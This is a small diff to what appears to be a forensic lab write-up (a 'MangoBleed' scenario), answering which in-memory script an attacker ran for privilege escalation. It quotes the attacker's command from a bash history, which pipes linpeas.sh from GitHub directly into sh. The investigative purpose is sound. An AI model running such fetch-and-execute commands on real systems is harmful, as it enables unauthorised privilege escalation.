@@ -64,7 +64,7 @@ Looking further, I found a successful login session from the `mongoadmin` accoun
 
 ## Question 7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
 
-I searched the command history file at `MangoBleed\uac-mongodbsync-linux-triage\[root]\home\mongoadmin\.bash_history` and found `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`. This command downloads and runs linpeas.sh, which is a tool that scans the system for possible privilege escalation paths.
+I searched the command history file at `MangoBleed\uac-mongodbsync-linux-triage\[root]\home\mongoadmin\.bash_history` and found `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`. This command downloads and runs linpeas.sh, which is a tool that scans the system for possible privilege escalation paths
 
 <img width="1912" height="267" alt="Image" src="https://github.com/user-attachments/assets/15706cee-adc5-45b7-8847-9a3657a190f3" />
 
